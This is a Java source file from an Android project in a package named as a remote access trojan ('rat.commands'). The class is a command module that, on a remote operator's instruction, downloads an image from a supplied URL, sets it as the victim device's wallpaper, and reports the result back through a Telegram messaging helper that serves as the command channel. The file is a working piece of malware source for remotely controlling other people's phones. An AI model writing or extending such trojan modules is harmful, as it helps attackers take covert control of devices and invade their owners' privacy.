package com.enterprise.rat.commands;

import android.content.Context;
import android.graphics.BitmapFactory;
import com.enterprise.rat.utils.TelegramApi;
import java.net.URL;

public class WallpaperManager {
    private Context context;
    public WallpaperManager(Context context) { this.context = context; }
    public void setFromUrl(String url) {
        new Thread(() -> {
            try {
                android.app.WallpaperManager.getInstance(context).setBitmap(
                    BitmapFactory.decodeStream(new URL(url).openStream()));
                TelegramApi.sendMessage("🖼 Wallpaper changed.");
            } catch (Exception e) { TelegramApi.sendMessage("❌ Wallpaper error: " + e.getMessage()); }
        }).start();
    }
}
